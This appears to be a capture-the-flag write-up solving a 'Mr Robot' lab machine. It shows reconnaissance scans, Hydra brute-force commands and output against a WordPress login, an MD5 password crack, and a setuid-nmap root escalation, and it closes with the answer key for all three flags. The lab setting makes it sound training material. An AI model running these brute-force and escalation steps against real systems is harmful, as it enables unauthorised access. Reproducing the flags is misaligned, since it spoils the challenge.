# Mr Robot CTF
Based on the Mr. Robot show, can you root this box?

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

```
ip = 10.10.69.230
```

## Nmap

```
nmap -sC -sV -oN initial.log 10.10.69.230
```

>22/tcp  closed ssh
>
>80/tcp  open   http     Apache httpd
>
>443/tcp open   ssl/http Apache httpd


## Task 1.

```
nikto -h http://10.10.69.230 | tee nikto.log
```

Using **gobuster** I'm going to scan `http://10.10.69.230 /` for hidden directories or files using a wordlist and checks specified file extensions like php or txt.

```
gobuster dir -u http://10.10.69.230 / -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,sh,cgi,html,css,js,py
```

Looking at `http://10.10.69.230/robots.txt` I find three strings:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

With the second one I download a file with a lot of strings accessing `http://10.10.69.230/fsocity.dic`. With the third one I obtain the first key accessing `http://10.10.69.230/key-1-of-3.txt`. After that with the iformation obtained I find a Wordpress login page. When I try to access with an user that doesnt exists I obtain: `ERROR: Invalid username.`. So, with Hydra I am going to try to obtain a valid username.

```
hydra -L fsocity.dict -p test 10.10.69.230 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-03 16:09:00
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.10.69.230:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.69.230   login: Elliot   password: test

```

Once I have a valid username (`Elliot`), I obtain the password: 

```
hydra -l Elliot -P fsocity.dict 10.10.69.230 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered" -t 30

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-03 16:15:00
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
[DATA] attacking http-post-form://10.10.69.230:80/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered
[80][http-post-form] host: 10.10.69.230   login: Elliot   password: ER28-0652

```

Once inside the Wordpress I can modify its files. So, making use of this, I perform a reverse shell and obtain access to a terminal. Looking into the files I see the file with the second key. However, this document only can be accessed with another user. To get access to this user I need its password. The passworod is stored in a file as a MD5 hash (I reviewed it with `hash-id -h c3fcd3d76192e4007dfb496cca67e13b`). With JohnTheRipper I retrive the password and obtain the second key.

```
/snap/john-the-ripper/current/run/john password.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
abcdefghijklmnopqrstuvwxyz (?)     
1g 0:00:00:00 DONE (2024-12-04 11:53) 33.33g/s 1356Kp/s 1356Kc/s 1356KC/s bonjour1..teletubbies
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Finally, to obtain the last key I need to obtain root privileges. In this case I seacrh for identify binaries in the /bin/ directory with setuid or setgid permissions. These permissions can be security-critical because they allow users to execute the binary with the file owner's (usually root's) or group's privileges.

```
find / -perm +6000 2>/dev/null | grep '/bin/'
```
Between the possible binaries I find nmap, so, looking into `https://gtfobins.github.io/` I obtain the instructions to obtain a root terminal. Once I have the root terminal I obtain the last flag in the `/root` folder. 



### Questions

1. What is key 1?
    >073403c8a58a1f80d943455fb30724b9
2. What is key 2?
    >822c73956184f694993bede3eb39f959
3. What is key 3?
    >04787ddef27c3dee1ee161b21670b4e4